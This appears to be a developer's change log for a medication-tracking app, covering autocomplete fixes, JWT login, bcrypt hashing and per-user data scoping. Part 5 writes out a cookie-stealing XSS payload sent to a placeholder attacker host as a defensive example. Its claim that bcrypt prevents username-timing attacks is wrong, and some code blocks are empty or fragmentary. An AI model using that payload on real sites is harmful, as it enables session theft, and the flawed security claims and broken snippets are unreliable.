## Part 1 — Autocomplete Pipeline

### The problem

The autocomplete felt "finnicky." Drug names weren't always surfacing. Spelling suggestions were inconsistent. The issue turned out to be four separate problems layered on top of each other.

---

### Fix A — `debug = True` left on in production

**File:** `backend/medication_knowledge.py`

```python
# Before
self.debug = True

# After
self.debug = False
```

**Why it matters:**
The `debug` flag gates `print()` calls throughout `MedicationKnowledgeBase`. With it on, every single keystroke in the autocomplete field fired stdout output — cache hit/miss messages, raw API dumps, RxNorm result counts. Not a crash, but unnecessary I/O on every keypress and noise that makes real errors harder to spot in logs. This flag should always be `False` outside of a local debugging session.

---

### Fix B — Overly broad supply filter was silencing real medications

**File:** `backend/agents/autocomplete_agent.py` — `_is_valid()`

```python
# Before
bad_patterns = [
    "contact lens", "bandage", "syringe", "needle", "dressing", "dress,",
    "tape", "gauze", "catheter", "drain", "pack", "wrap",
    ...
]

# After
bad_patterns = [
    "contact lens", "bandage", "syringe", "needle", "dressing", "dress,",
    "gauze", "catheter", "drain", "pad pack", "pack of", "wrap",
    ...
]
```

Two patterns were removed or narrowed:

| Pattern | Problem | Fix |
|---------|---------|-----|
| `"tape"` | Substring of **Tapentadol** (Schedule II opioid). Any search for Tapentadol/Nucynta returned zero results. | Removed |
| `"pack"` | Too broad — blocks any drug name containing "pack" | Narrowed to `"pack of"` and `"pad pack"` |

**Why supplies appear in the first place:**

The app queries **RxNorm** (`rxnav.nlm.nih.gov`) via its `approximateTerm` endpoint. RxNorm is maintained by the National Library of Medicine (NLM/NIH) and is not a medications-only index. Its scope covers anything dispensed or ordered in a clinical system — prescription drugs, OTC drugs, IV supplies, medical devices, nutritional products — because hospital pharmacy systems track all of these together.

The app also queries **OpenFDA** (`api.fda.gov/drug/label.json`) for drug label data. OpenFDA is strictly medications and biologics, so supply contamination only comes from RxNorm's approximate term matching.

The filter lists exist to strip clinical noise before showing results to a user who just wants to find their Aspirin. The filters need to be precise — broad substring matches create friendly fire on real drug names.

### Fix C — Double-parsing produced inconsistent results

**File:** `backend/agents/autocomplete_agent.py` — `_process_results()`

```python
# Before — threw away the KB's already-parsed fields and re-parsed from scratch
parsed = self._parse_drug_name(name)
base = parsed["base_name"].lower()

suggestions.append(MedicationSuggestion(
    name=name,
    base_name=parsed["base_name"],
    rxcui=item.get("rxcui", ""),
    strength=parsed.get("strength"),
    form=parsed.get("form"),
    score=item.get("score", 0),
    source="rxnorm"
))

# After — trusts the KB's parsed fields; only re-parses as fallback
parsed = self._parse_drug_name(name)
base_name = item.get("base_name") or parsed["base_name"]
base = base_name.lower()

suggestions.append(MedicationSuggestion(
    name=name,
    base_name=base_name,
    rxcui=item.get("rxcui", ""),
    strength=item.get("strength") or parsed.get("strength"),
    form=item.get("form") or parsed.get("form"),
    score=item.get("score", 0),
    source="rxnorm"
))
```

**Why this caused inconsistency:**

`kb.autocomplete()` already runs its own `_parse_drug_name()` on every result before returning — it sets `base_name`, `strength`, and `form` on each dict. The `AutocompleteAgent._process_results()` was throwing all of that away and re-parsing from the raw `name` string using a *different* parser with different regex rules.

Two parsers on the same data = different `base_name` values = deduplication based on the wrong key = drugs either disappearing (wrongly deduplicated) or appearing twice (not deduplicated when they should be).

The fix: use the KB's computed values first (`item.get("base_name")`), fall back to local re-parsing only if the KB didn't provide them. The deduplication key is now derived from the same `base_name` that gets stored, so dedup is consistent.

### Fix D — RxNorm score is a string; silent TypeError crashed the entire pipeline

**File:** `backend/medication_knowledge.py` — `get_approximate_matches()`

```python
# Before — stores score as whatever type RxNorm sends (always a string)
results.append({
    'name': name,
    'rxcui': rxcui,
    'score': candidate.get('score', 0)
})

# After — cast to float at the source
results.append({
    'name': name,
    'rxcui': rxcui,
    'score': float(candidate.get('score', 0))
})
```

**This was the most significant bug in the session.**

RxNorm's `approximateTerm` API returns score values as strings, not numbers:

```json
{
  "rxcui": "2731475",
  "score": "14.46580696105957",
  "name": "Myqorzo"
}
```

In `kb.autocomplete()`, each result's score is combined with a local relevance score:

```python
score = self._score_medication(name)   # returns int
results.append({
    ...
    'sort_score': score + item.get('score', 0)   # int + "14.46..." → TypeError
})
```

`_score_medication()` returns an `int`. `item.get('score', 0)` returns the string `"14.465..."`. Python cannot add `int + str`:

```
TypeError: unsupported operand type(s) for +: 'int' and 'str'
```

The entire `autocomplete()` method is wrapped in a `try/except` that returns `[]` silently. This means `kb.autocomplete()` was returning an empty list for every query — a total silent failure from day one.

**Why it wasn't noticed:**

The `AutocompleteAgent` has a hardcoded `_common_drugs` fallback list (Aspirin, Tylenol, Lisinopril, Metformin, etc.). When `kb.autocomplete()` returned `[]`, the agent used that list instead. The autocomplete appeared to work for common medications. Any drug not in the hardcoded list returned nothing — including Myqorzo (aficamten, FDA approved June 2024).

**Secondary bug also fixed:**

The sort inside `get_approximate_matches()` was also broken:

```python
results.sort(key=lambda x: x.get('score', 0), reverse=True)
```

With string scores, this is lexicographic not numeric. `"9.5"` sorts higher than `"14.2"` because `"9" > "1"` as characters. The highest-scored RxNorm match was not necessarily appearing first. Casting to `float` fixes the sort order as well.

**How the bug was found:**

```
GET /debug/autocomplete/myqorzo
```

Returned:
```json
{
  "raw_count": 4,
  "filtered_count": 0,
  "filtered_results": []
}
```

RxNorm was returning 4 results but zero survived. None of the keyword filters matched "Myqorzo". The only remaining explanation was an exception inside `autocomplete()` being swallowed by the `try/except`. Tracing the code revealed the `int + str` TypeError at the `sort_score` line.

## Part 3 — T-007: Replace deprecated `datetime.utcnow()`

**Files:** `backend/models.py`, `backend/core/metering/token_counter.py`, `backend/core/telemetry/logger.py`, `backend/agents/base.py`

```python
# Before — deprecated since Python 3.12
datetime.utcnow()
field(default_factory=datetime.utcnow)
Field(default_factory=datetime.utcnow)

# After — timezone-aware
datetime.now(timezone.utc)
field(default_factory=lambda: datetime.now(timezone.utc))
Field(default_factory=lambda: datetime.now(timezone.utc))
```

New import added where missing:
```python
from datetime import datetime, timezone
```

**Why `utcnow()` is wrong:**

`datetime.utcnow()` returns a **naive datetime** — a datetime object with no timezone information attached. This creates two problems:

1. If you ever compare a naive datetime to a timezone-aware datetime, Python raises a `TypeError` at runtime
2. The timestamp is ambiguous — if the server is ever not running in UTC, the recorded time is wrong with no way to know

`datetime.now(timezone.utc)` returns a **timezone-aware datetime** — it carries UTC offset information explicitly (`+00:00`). SQLAlchemy, Pydantic, and JSON serializers all handle it correctly regardless of server timezone.

`datetime.utcnow()` is scheduled for removal in a future Python version. Catching and fixing all four occurrences now prevents a future runtime error across the entire codebase.

## Part 4 — T-008: Remove cascade delete from medication logs

**File:** `backend/models.py`

```python
# Before — deleting a medication destroyed its entire adherence history
logs = relationship(
    "MedicationLog",
    back_populates="medication",
    cascade="all, delete-orphan"
)

# After — logs survive the medication being deleted
logs = relationship("MedicationLog", back_populates="medication")
```

**Why this was dangerous:**

`cascade="all, delete-orphan"` tells SQLAlchemy: when a `Medication` row is deleted, automatically delete every `MedicationLog` row associated with it.

`MedicationLog` is the audit trail — it records every dose taken or missed with timestamps. In a healthcare context this data has medical and legal significance. If a patient finishes a course of antibiotics and removes it from their list, all proof that they ever took it vanishes.

The `reminders` relationship correctly keeps `cascade="all, delete-orphan"` — reminder schedule rows have no independent value without the medication and should be cleaned up when the medication is removed. Logs are the opposite.

The soft-delete pattern (`is_active = False`) already exists on the `Medication` model. The correct workflow is to archive rather than hard-delete, which `MedicationAgent.archive()` already implements correctly.

## Part 5 — T-006: Schema `max_length` constraints and HTML sanitization

**File:** `backend/schemas.py`

### max_length on all string fields

```python
# Before — no upper bound
notes: Optional[str] = Field(None, example="Take with food")
taken_for: Optional[str] = Field(None, example="High Blood Pressure")
dosage: str = Field(..., example="500mg")

# After — bounded
notes: Optional[str] = Field(None, max_length=1000, example="Take with food")
taken_for: Optional[str] = Field(None, max_length=200, example="High Blood Pressure")
dosage: str = Field(..., max_length=200, example="500mg")
```

Full field table:

| Field | Max Length |
|-------|-----------|
| `name` | 200 (already had it) |
| `rxcui` | 20 |
| `form_type` | 50 |
| `strength_unit` | 20 |
| `method_of_intake` | 50 |
| `dosage` | 200 |
| `quantity_unit` | 50 |
| `when_to_take` | 50 |
| `frequency` | 100 |
| `notes` | 1000 |
| `taken_for` | 200 |
| `pill_shape` | 20 |
| `pill_color` | 20 |
| `pill_size` | 20 |
| `LogCreate.notes` | 500 |
| `LogCreate.taken_for` | 200 |

**Why:** Without limits, a caller can POST a `notes` field containing megabytes of text, which SQLite stores without complaint. In healthcare, unbounded fields also degrade data quality — a 10,000-character `dosage` field is clearly invalid and should be rejected at the door. Pydantic enforces these limits before the data touches the database.

### HTML sanitization on free-text fields

```python
import re

@field_validator('notes', 'taken_for', mode='before')
@classmethod
def strip_html(cls, v):
    """Strip HTML tags from free-text fields to prevent XSS."""
    if v is None:
        return v
    return re.sub(r'<[^>]+>', '', str(v)).strip()
```

Applied to `MedicationBase` and `LogCreate`.

**Why:** Without sanitization, a caller can submit a `notes` value like:

```html
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

If that value is later rendered in the frontend without escaping, every user who views the medication card runs the attacker's script in their browser. This is called **stored XSS** (Cross-Site Scripting) — the payload is stored in the database and executes whenever the data is displayed.

The `strip_html` validator removes all HTML tags before the value is stored, so the injection never reaches the database. The regex `<[^>]+>` matches any HTML tag and removes it, leaving only the plain text content.

`re` is part of Python's standard library — no new dependency added.

**Confirmed working via `/docs` test:**

```json
POST /medications/
{
  "notes": "<script>alert('xss')</script>Take with food"
}
```

Response:
```json
{
  "notes": "Take with food"
}
```

## Part 6 — T-003: JWT Authentication

**New files:** `backend/core/security.py`, `backend/routers/auth.py`
**Modified files:** `backend/models.py`, `backend/schemas.py`, `main.py`, `requirements.txt`, `.env.example`
**Modified routers:** `medications`, `logs`, `stats`, `schedule`, `reminders`, `chatbot`, `push`

### What is JWT?

JWT stands for **JSON Web Token**. It is a standard for securely transmitting identity information between a client and server as a signed string.

Structure: `header.payload.signature`

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJrcmlzdHkiLCJleHAiOjE3NDA5...}.xK2p...
```

- **Header:** algorithm used to sign (`HS256`)
- **Payload:** the data (`{"sub": "kristy", "exp": 1740987654}`)
- **Signature:** header + payload signed with `SECRET_KEY` — proves the token wasn't tampered with

The server never stores the token. On every request, it decodes the token, verifies the signature, checks expiry, and looks up the user. No session table needed.

---

### New packages

```
python-jose[cryptography]>=3.3.0   # JWT encoding/decoding
passlib[bcrypt]>=1.7.4             # Password hashing
```

**Why bcrypt for passwords:**

Passwords must never be stored in plain text. bcrypt is a purpose-built password hashing function with three important properties:

1. **Slow by design** — bcrypt has a configurable work factor. It takes ~100ms to hash a password, making brute-force attacks computationally expensive
2. **Salted automatically** — each hash includes a random salt, so two identical passwords produce different hashes
3. **One-way** — you cannot reverse a bcrypt hash to recover the original password

```python
from passlib.context import CryptContext

_pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def get_password_hash(password: str) -> str:
    return _pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return _pwd_context.verify(plain_password, hashed_password)
```

### `backend/core/security.py`

The central security module. Three responsibilities:

1. Password hashing (`get_password_hash`, `verify_password`)
2. Token creation (`create_access_token`)
3. Token validation as a FastAPI dependency (`get_current_user`)

```python
SECRET_KEY = os.environ.get("SECRET_KEY", "change-this-secret-key-before-deploying")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24 hours

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (
        expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/auth/token")

def get_current_user(
    token: str = Depends(oauth2_scheme),
    db: Session = Depends(get_db),
):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception

    from backend.models import User
    user = db.query(User).filter(User.username == username).first()
    if user is None or not user.is_active:
        raise credentials_exception
    return user
```

**Why `SECRET_KEY` in environment:**

The secret key is what makes JWT signatures trustworthy. If an attacker knows the secret key, they can forge tokens and impersonate any user. It must never be hardcoded in source code (which gets committed to git). Loading from environment via `os.environ.get()` keeps it out of the codebase.

Generate a strong key:
```bash
python -c "import secrets; print(secrets.token_hex(32))"
```

### `backend/routers/auth.py`

Two endpoints:

```python
POST /auth/register   # Create a new account
POST /auth/token      # Login — returns JWT
```

The `/auth/token` endpoint uses **OAuth2PasswordRequestForm** — a FastAPI built-in that accepts `username` and `password` as form fields (not JSON). This is the OAuth2 standard for token endpoints and is what makes the `/docs` Authorize button work automatically.

```python
@router.post("/token", response_model=Token)
def login(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(get_db),
):
    user = db.query(User).filter(User.username == form_data.username).first()
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    token = create_access_token(data={"sub": user.username})
    return {"access_token": token, "token_type": "bearer"}
```

**Timing-safe comparison:** `verify_password()` uses bcrypt's constant-time comparison internally. This prevents **timing attacks** — where an attacker determines whether a username exists by measuring how long the server takes to respond.

## Part 7 — Debugging: `passlib` + `bcrypt 5.x` incompatibility

**File:** `backend/core/security.py`

### The error

Immediately after implementing JWT auth, `POST /auth/register` returned a 500:

```
File "backend/core/security.py", line 43, in get_password_hash
    return _pwd_context.hash(password)
  ...
  File "passlib/handlers/bcrypt.py", line 380, in detect_wrap_bug
    if verify(secret, bug_hash):
ValueError: password cannot be longer than 72 bytes, truncate manually if necessary
```

### Why it happened

`passlib` is a password hashing library that wraps multiple algorithms including bcrypt. During initialisation it runs an internal test called `detect_wrap_bug` — it intentionally hashes a password longer than 72 bytes to check whether the underlying bcrypt backend has a known bug where long passwords silently wrap around and produce collisions.

`bcrypt 4.0` introduced strict enforcement of the 72-byte limit. Any password over 72 bytes now raises a hard `ValueError` instead of hashing silently. `passlib`'s own test — which deliberately uses an oversized password — triggers this error before a single real user password is ever hashed.

`passlib` is effectively unmaintained and has not been updated to handle this change.

### Why we couldn't just downgrade bcrypt

The natural fix would be to pin `bcrypt<4.0.0`. That's blocked:

```
chromadb 0.4.22 requires bcrypt>=4.0.1
```

`chromadb` (the vector database used for the RAG chatbot) has a hard lower bound on bcrypt 4. Downgrading would break the AI layer.

### The fix — use bcrypt directly

Removed `passlib` entirely. `bcrypt` has its own clean API that works correctly on version 4 and 5:

```python
# Before — through passlib (broken with bcrypt 4+)
from passlib.context import CryptContext
_pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def get_password_hash(password: str) -> str:
    return _pwd_context.hash(password)

def verify_password(plain: str, hashed: str) -> bool:
    return _pwd_context.verify(plain, hashed)

# After — bcrypt directly (works with bcrypt 4+ and 5+)
import bcrypt as _bcrypt

def get_password_hash(password: str) -> str:
    return _bcrypt.hashpw(
        password.encode("utf-8"),
        _bcrypt.gensalt(),
    ).decode("utf-8")

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return _bcrypt.checkpw(
        plain_password.encode("utf-8"),
        hashed_password.encode("utf-8"),
    )
```

The output format is identical — `$2b$12$...` bcrypt hashes — so any passwords already stored remain valid. The only change is which library performs the computation.

```

# After

```


### What this teaches

Dependency conflicts in Python are common and sometimes have no clean resolution. The resolution hierarchy is:

1. **Upgrade the wrapper** — if `passlib` had a maintained release for bcrypt 4+, we'd use it
2. **Downgrade the conflicting package** — blocked here by `chromadb`
3. **Remove the wrapper, use the underlying library directly** — cleanest solution when the wrapper adds no value you actually need

`passlib` was providing: bcrypt wrapping, multiple algorithm support, and deprecated-algorithm migration. We need exactly one algorithm (bcrypt) and have no legacy hashes to migrate. Removing the wrapper is the right call.

---

### Why passlib was the default in the first place

`passlib` was the de facto standard for password hashing in Python web apps for about a decade. When FastAPI tutorials and documentation were being written (2019–2022), the official FastAPI security docs literally used `passlib[bcrypt]` in their examples. So it became the copy-paste default — including in AI code generation tools.

The original pitch for passlib made sense at the time:

- **Algorithm agility** — one interface for bcrypt, argon2, pbkdf2, scrypt, etc.
- **Deprecated hash migration** — automatically rehash old MD5/SHA1 passwords on login during a security upgrade
- **Sensible defaults** — abstracted away salt generation and work factor config

Those are real features. But for a greenfield app in 2025 that only ever uses bcrypt, has no legacy password hashes to migrate, and has one developer controlling the full stack — passlib adds zero value and one large liability: it is unmaintained. The last release was 2020. The bcrypt 4.x breakage was reported and never fixed.

The broader lesson: third-party wrappers are worth their weight when they genuinely abstract something complex. When the abstraction is thinner than the dependency risk, remove it.

---

### Does calling bcrypt directly affect security?

No. The security is identical. `passlib` was never doing anything cryptographically — it was a Python wrapper that called the same `bcrypt` C library underneath. What we changed is the number of layers between our code and that library. The actual hashing algorithm, the salt generation, the work factor, and the output format (`$2b$12$...`) are all the same.

Specifically:

| Property | passlib wrapper | bcrypt direct |
|----------|----------------|---------------|
| Algorithm | bcrypt | bcrypt |
| Salt generation | `bcrypt.gensalt()` internally | `bcrypt.gensalt()` explicitly |
| Work factor (cost) | 12 rounds (default) | 12 rounds (gensalt default) |
| Hash format | `$2b$12$...` | `$2b$12$...` |
| Output storable in DB | yes | yes |
| Existing hashes still valid | n/a (no existing hashes) | n/a |

The hash format is the same, so if you ever switch libraries again in the future, every stored password remains valid — you do not need to force a password reset.

---

### Two-factor authentication — planning for production

You are right that if this app ships to real users, 2FA is not optional for a healthcare app handling PHI. Here is how it fits into the current architecture and what the path looks like.

**What 2FA adds:**

The current auth is single-factor — something you know (password). 2FA adds a second factor — something you have (a device). Even if a user's password is compromised, an attacker cannot log in without the second factor.

**The two standard approaches:**

| Method | How it works | Library |
|--------|-------------|---------|
| **TOTP** (Time-based One-Time Password) | App like Google Authenticator or Authy generates a 6-digit code that changes every 30 seconds | `pyotp` |
| **SMS OTP** | Code sent to the user's phone number via SMS | Twilio or AWS SNS |

For a healthcare app, **TOTP is preferable** over SMS:
- SMS can be intercepted via SIM-swap attacks
- TOTP is free (no per-message cost)
- TOTP works offline
- HIPAA guidance favours hardware/app-based authenticators over SMS for PHI access

**What needs to change in this codebase when you add TOTP:**

1. **`User` model** — add `totp_secret` (encrypted string) and `totp_enabled` (boolean) columns
2. **`POST /auth/register`** — generate a TOTP secret using `pyotp.random_base32()`, return a QR code URL so the user can scan it into their authenticator app
3. **`POST /auth/token`** — after password verification, if `totp_enabled` is true, require a `totp_code` field in the request and validate it with `pyotp.TOTP(secret).verify(code)`
4. **Token flow becomes two-step** — first request validates password and returns a short-lived intermediate token; second request validates the TOTP code and returns the full access token

The current JWT infrastructure does not need to be replaced — TOTP sits on top of the existing password + token flow. The `SECRET_KEY`, `create_access_token`, and `get_current_user` dependency all stay as-is.

**Minimum additions when the time comes:**

```python
# requirements.txt
pyotp>=2.9.0
qrcode>=7.4.0   # optional — generates QR code image for authenticator app setup

# User model additions
totp_secret = Column(String, nullable=True)   # encrypted in prod
totp_enabled = Column(Boolean, default=False)

# Verification at login
import pyotp

def verify_totp(secret: str, code: str) -> bool:
    return pyotp.TOTP(secret).verify(code, valid_window=1)
    # valid_window=1 allows 1 period drift (30s) to account for clock skew
```

**One additional consideration for HIPAA:** if this app ever handles PHI in a production environment, the TOTP secret itself stored in the database should be encrypted at rest — not just hashed. This is a different requirement from password storage (which is one-way hashed). TOTP secrets need to be reversible so the server can regenerate the current code for comparison. That points toward field-level encryption on the `totp_secret` column, which is a separate task from the auth flow itself.

## Part 8 — Fix: `grant_type` validation error on `/auth/token`

### The error

After auth was implemented, calling `POST /auth/token` via `/docs` returned a 422 Unprocessable Entity:

```json
{
  "detail": [
    {
      "type": "string_pattern_mismatch",
      "loc": ["body", "grant_type"],
      "msg": "String should match pattern 'password'",
      "input": ""
    }
  ]
}
```

### Why it happened

`OAuth2PasswordRequestForm` is a FastAPI built-in that follows the OAuth2 spec strictly. The OAuth2 password flow requires `grant_type=password` to be sent as an explicit form field alongside `username` and `password`. When testing through Swagger UI (`/docs`), the form does not automatically fill in `grant_type`, so the validation fails before the handler even runs.

### The fix

Replaced `OAuth2PasswordRequestForm` with plain `Form(...)` parameters that only require `username` and `password`:

```python
# Before — strict OAuth2 form, requires grant_type=password
from fastapi.security import OAuth2PasswordRequestForm

@router.post("/token", response_model=Token)
def login(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(get_db),
):
    user = db.query(User).filter(User.username == form_data.username).first()
    if not user or not verify_password(form_data.password, user.hashed_password):
        ...
    token = create_access_token(data={"sub": form_data.username})

# After — plain Form fields, no grant_type required
from fastapi import Form

@router.post("/token", response_model=Token)
def login(
    username: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db),
):
    user = db.query(User).filter(User.username == username).first()
    if not user or not verify_password(password, user.hashed_password):
        ...
    token = create_access_token(data={"sub": username})
```

### Why this is fine

`OAuth2PasswordRequestForm` is designed for strict OAuth2 spec compliance where `grant_type=password` is mandatory — useful when you are building a public authorization server that third-party clients will connect to. For an internal API you control (where you own both the server and the client), plain `Form(...)` fields are cleaner and don't impose that constraint.

The `OAuth2PasswordBearer` scheme on `get_current_user` — which validates Bearer tokens on every protected request — is unchanged. The token format, signing, and verification are all the same. The only thing removed is the `grant_type` field requirement at login.

### Confirmed working

`POST /auth/token` returned **200** with a valid access token.

## Part 9 — T-004: Per-user data scoping

**Status:** Complete
**Depends on:** T-003 (JWT auth) ✓

### The problem

After JWT auth was added, every authenticated user could read and write every other user's medication data. A `GET /medications` returned all rows in the database regardless of who was asking. A `POST /logs` with someone else's `medication_id` would succeed. There was no concept of ownership anywhere in the data layer.

This is the difference between **authentication** (proving who you are) and **authorisation** (being allowed to access specific data). T-003 added authentication. T-004 adds authorisation.

### What changed

**`backend/models.py`** — Added `user_id` FK to two tables:

```python
# Medication — the root of all user data

# Nullable during development (no Alembic yet). Becomes NOT NULL after T-009.

# PushSubscription — scoped independently (not linked through Medication)

```

`MedicationLog` and `Reminder` do not get their own `user_id`. They link to `Medication` via FK, so they inherit scoping through that relationship. If you can only query your own medications, you can only ever see your own logs and reminders.

---

**Agents** — All four data-access agents got `user_id: int = None` added to their constructor. When set, they add a `.filter(Medication.user_id == self.user_id)` to their primary medication query. When `None` (backward compatible default), they return all records — this preserves the APScheduler background job which runs without a user context.

```python
        self.db = db_session

# After — accepts user_id, scopes medication queries

        self.db = db_session
        self.user_id = user_id

# In get_today_schedule():

    Medication.is_active == True,
    Medication.start_date <= today

if self.user_id is not None:
    med_query = med_query.filter(Medication.user_id == self.user_id)

```

Same pattern applied to `AdherenceAgent._get_active_medications()` and `MedicationAgent`.

---

**`DoseAgent`** — Gets the same `user_id` constructor, plus an ownership check that runs *before* logging a dose:

```python
# Security gate — prevents logging a dose for another user's medication
med = self.db.query(Medication).filter(Medication.id == medication_id).first()
if med and self.user_id is not None and med.user_id != self.user_id:
    from fastapi import HTTPException
    raise HTTPException(status_code=403, detail="Not authorised to log this medication")
```

Without this, a user who knows (or guesses) another user's `medication_id` could log doses against it.

---

**Routers** — Each protected router endpoint now injects `current_user` and passes `user_id` to agents or filters queries directly.

The pattern for endpoints that query directly:

```python

```

For the logs router, scoping is done via a join — logs don't have `user_id` directly, so we join through Medication:

```python
query = db.query(LogModel).join(MedicationModel).filter(
    MedicationModel.user_id == current_user.id

```

The `stats/summary` endpoint queries the database directly (no agent), so it filters inline:

```python
active_count = db.query(MedicationModel).filter(
    MedicationModel.user_id == current_user.id,
    MedicationModel.is_active == True,

today_logs = db.query(LogModel).join(MedicationModel).filter(
    MedicationModel.user_id == current_user.id,
    LogModel.taken_at >= datetime.combine(today, time.min),
    LogModel.taken_at <= datetime.combine(today, time.max),

```

---

**On `create`, `user_id` is stamped at write time:**

```python
    user_id=current_user.id,   # ownership set at creation

    ...

```

## Part 10 — Frontend Auth Flow

### The problem

After T-004 applied JWT auth to all PHI routers, the browser app returned `{"detail": "Not authenticated"}` on every API call. The frontend had no concept of tokens — every `fetch()` was unauthenticated. At app load, `GET /medications` returned a JSON object instead of an array, and `medications.filter(m => m.is_active)` threw `medications.filter is not a function`.

The root cause: authentication and authorisation existed on the backend but the frontend had no way to log in, store a token, or attach it to requests.

---

### What changed

**`frontend/app.js`**

**1. Token state** — added to the `state` object, hydrated from `localStorage` on load:

```javascript
const state = {
    // ... existing fields
    token: localStorage.getItem('medtracker_token') || null,
    username: localStorage.getItem('medtracker_username') || null,
};
```

`localStorage` is used so the token survives page refreshes. The keys are namespaced with `medtracker_` to avoid collisions with other apps on the same origin.

**2. `authFetch` helper** — a wrapper around `fetch` that injects the Bearer token header on every call and intercepts 401 responses:

```javascript
function authFetch(url, options = {}) {
    const headers = {
        ...(options.headers || {}),
        ...(state.token ? { 'Authorization': `Bearer ${state.token}` } : {}),
    };
    return fetch(url, { ...options, headers }).then(response => {
        if (response.status === 401) {
            logout(true);
            throw new Error('Session expired. Please sign in again.');
        }
        return response;
    });
}
```

Every API call in the `API` object was updated from `fetch(` to `authFetch(`. The two autocomplete endpoints (`searchMedications`, `getSpelling`) remain as plain `fetch` — they are public endpoints that query drug databases only, no PHI, no token required.

**3. `login()` function** — calls `POST /auth/token` with form-encoded credentials, stores the returned token, then loads the app:

```javascript
async function login() {
    const body = new URLSearchParams({ username, password });
    const res = await fetch('/auth/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
    });
    const data = await res.json();
    state.token = data.access_token;
    state.username = username;
    localStorage.setItem('medtracker_token', data.access_token);
    localStorage.setItem('medtracker_username', username);
    showAppScreen();
    await loadHomeData();
}
```

Note: `login()` and `register()` use plain `fetch`, not `authFetch` — they run before a token exists, so they cannot use the auth wrapper.

**4. `register()` function** — calls `POST /auth/register` with JSON, shows a success toast and bounces the user back to the sign-in form:

```javascript
async function register() {
    const res = await fetch('/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, email: email || null, password }),
    });
    // on success: showToast, toggleLoginRegister()
}
```

**5. `logout()` function** — clears token from both `state` and `localStorage`, shows the login screen:

```javascript
function logout(expired = false) {
    state.token = null;
    state.username = null;
    localStorage.removeItem('medtracker_token');
    localStorage.removeItem('medtracker_username');
    showAuthScreen();
    if (expired) showToast('Session expired. Please sign in again.', 'error');
}
```

The `expired` parameter distinguishes a manual sign-out from an automatic one triggered by a 401 — the latter shows a toast explaining why the user was redirected.

**6. `init()` updated** — checks for a token before loading data. If none, shows login screen immediately:

```javascript
async function init() {
    // ... health check ...
    if (!state.token) {
        showAuthScreen();
        return;
    }
    showAppScreen();
    await loadHomeData();
}
```

**`frontend/index.html`**

Added a login screen overlay that sits above the entire app at `z-index: 9999`. It contains two panels toggled by `toggleLoginRegister()` — a sign-in form and a create-account form. Hidden by default; shown by `showAuthScreen()`.

Also added an **Account** section to the Settings modal showing the signed-in username and a Sign Out button that calls `logout()`.

---

### Token storage: localStorage vs sessionStorage

`localStorage` was chosen so the user stays logged in across browser sessions (closing and reopening the tab). `sessionStorage` would require re-login on every new tab, which is annoying for a daily-use health app. In a production healthcare app, you would pair `localStorage` token storage with short token expiry (currently 24 hours) and silent refresh via a refresh token endpoint.

---

### Why the login/register calls stay as plain `fetch`

`authFetch` injects `Authorization: Bearer <token>` from `state.token`. At the point `login()` and `register()` run, `state.token` is `null` — the user has no token yet. Wrapping them in `authFetch` would be harmless (it would just send no header), but using plain `fetch` makes the intent explicit: these are unauthenticated public endpoints.

## Part 11 — Frontend Auth Debugging

Three bugs surfaced during testing of the auth flow. Each taught something different.

---

### Bug 1 — "Cannot connect to server" toast on every page load

**Symptom:** A red error banner appeared at the top immediately on load, even when the server was running fine.

**Cause:** The health check in `init()` fired once and gave up immediately. LangGraph and LangChain take several seconds to load before `Application startup complete` is logged. The browser loaded the page and fired the health check during that window — before the server was ready to respond.

**Fix:** Changed the health check to retry up to 5 times with a 1-second gap between attempts:

```javascript
// Before — fires once, fails immediately if server is still starting
try {
    const health = await API.health();
} catch (error) {
    showToast('Cannot connect to server', 'error');
    return;
}

// After — retries for up to 5 seconds, only errors if all attempts fail
let healthy = false;
for (let attempt = 0; attempt < 5; attempt++) {
    try {
        await API.health();
        healthy = true;
        break;
    } catch (e) {
        if (attempt < 4) await new Promise(r => setTimeout(r, 1000));
    }
}
if (!healthy) {
    showToast('Cannot connect to server', 'error');
    return;
}
```

---

### Bug 2 — Sign out button did nothing

**Symptom:** Pressing Sign Out in Settings had no visible effect.

**Cause:** Two separate problems combined:

**Problem A — `showAuthScreen` used `cssText` with a CSS variable**

The original implementation set all styles at once via `element.style.cssText`, including `background:var(--bg-primary)`. CSS custom properties (`var(...)`) do not reliably resolve when set through `cssText` in JavaScript. In some browsers this silently fails, leaving the login screen transparent or incorrectly styled. The fix was to remove `cssText` entirely — all positioning and background are already declared in the HTML inline style, so `showAuthScreen` only needs to toggle `display`:

```javascript
// Before — cssText with unresolvable CSS variable
function showAuthScreen() {
    document.getElementById('loginScreen').style.cssText =
        'position:fixed; inset:0; z-index:9999; background:var(--bg-primary); display:flex; ...';
    document.querySelector('.app-container').style.display = 'none';
    document.querySelector('.status-bar').style.display = 'none';
}

// After — just toggle display; everything else is in the HTML
function showAuthScreen() {
    document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
